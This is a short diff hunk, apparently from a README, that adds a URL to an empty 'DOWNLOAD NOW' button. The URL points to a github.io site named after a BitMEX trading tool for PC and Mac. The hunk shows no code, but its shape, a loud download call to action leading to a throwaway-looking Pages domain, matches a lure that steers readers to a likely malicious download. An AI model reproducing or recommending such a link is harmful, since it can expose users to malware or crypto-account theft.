@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://bitmex-tradot-pcwinmac-um29.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
